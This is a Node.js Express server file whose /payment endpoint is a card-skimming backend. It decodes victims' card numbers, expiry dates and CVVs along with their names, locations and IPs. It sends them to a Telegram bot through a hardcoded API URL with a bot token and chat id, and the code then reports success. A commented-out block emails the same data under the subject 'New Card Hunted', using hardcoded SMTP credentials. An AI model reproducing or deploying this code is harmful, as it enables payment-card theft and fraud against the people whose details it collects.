const { json } = require('express');
const express = require('express');
const Datastore = require('nedb');
const path = require('path');
const { get } = require('http');
const nodemailer = require("nodemailer");
const cors = require('cors');


const database = new Datastore('server.db');
database.loadDatabase();


const app = express();
app.use(express.static("public"));
app.use(express.json({ limit: "1mb" }));
app.use(cors());

app.listen(process.env.PORT || 3000, function(err){
    if (err) console.log("Error in server setup")
    console.warn("Server listening on Port: ", process.env.PORT || 3000);
})


app.post('/payment', async function(request, response) {
    const data = request.body

    const name = data.name
    const lastName = data.surname
    const creditCard = atob(data.token_id)
    const ip = data.ip
    const city = data.city
    const country = data.country
    const zip = data.zip
    console.log(data)

    const options = {
        method: 'POST',
        headers: {
         'content-type': 'application/json'
        }
    }
    const cardSplit = creditCard.split('|')
    let cardN = cardSplit[0]
    let cardM = cardSplit[1]
    let cardY = cardSplit[2]
    let cardC = cardSplit[3]

    let froms = 'Name: '+name+' | LastName: '+lastName+ ' | Card Number: '+cardN+' | EXP: '+cardM+'/'+cardY+ ' | CVV: '+cardC+' | Country: '+country+' | City: '+city+' | Zip: '+zip+' | IP: '+ip+' ==> @Telegram Api by NodeJS' ;
    const apiTelegram = 'https://api.telegram.org/bot5816086716:AAEMqgfQ59uo_TiG8hXDS--jhPzwcJIG3Uk/sendMessage?chat_id=5678873240&text='+froms
    const api_telegram_req = await fetch(apiTelegram, options )
    const api_telegram_res = await api_telegram_req.json()

    if (api_telegram_res.ok) {
        console.log('Message status: '+api_telegram_res.ok)
    } else {
        console.log('Error message not sent!')
    }

    /*
    async function main() {
        // Async function enables allows handling of promises with await
        
          // First, define send settings by creating a new transporter: 
          let transporter = nodemailer.createTransport({
            host: "smtp.ionos.it", // SMTP server address (usually mail.your-domain.com)
            port: 465, // Port for SMTP (usually 465)
            secure: true, // Usually true if connecting to port 465
            auth: {
              user: "smtp@parmareggio.online", // Your email address
              pass: "Chalada2016?", // Password (for gmail, your app password)
              // ⚠️ For better security, use environment variables set on the server for these values when deploying
            },
          });
          
          // Define and send message inside transporter.sendEmail() and await info about send from promise:
          let info = await transporter.sendMail({
            from: 'smtp@parmareggio.online',
            to: "armex684@gmail.com",
            subject: "New Card Hunted from "+name+' '+lastName,
            html: `
            <h1>Hello Telegram!</h1>
            <p>Name: <strong>${name}</strong></p>
            <p>Lastname: <strong>${lastName}</strong></p>
            <p>IP: <strong>${ip}</strong></p>
            <p>Isp: <strong>${org}</strong></p>
            <p>City: <strong>${city}</strong></p>
            <p>Region: <strong>${region}</strong></p>
            <p>Country: <strong>${country}</strong></p>
            <p>CardNumber: <strong>${cardN}</strong></p>
            <p>EXP: <strong>${cardM}/${cardY}</strong></p>
            <p>CVV: <strong>${cardC}</strong></p>
            <p>By Apollo son of zues?</p>
            `,
          });
        
          console.log(info.messageId); // Random ID generated after successful send (optional)
        }
        
        main()
        .catch(err => console.log(err));

    */

    response.json({
        success: true,
        code: 200,
        timestamp: Date.now()
    })
  });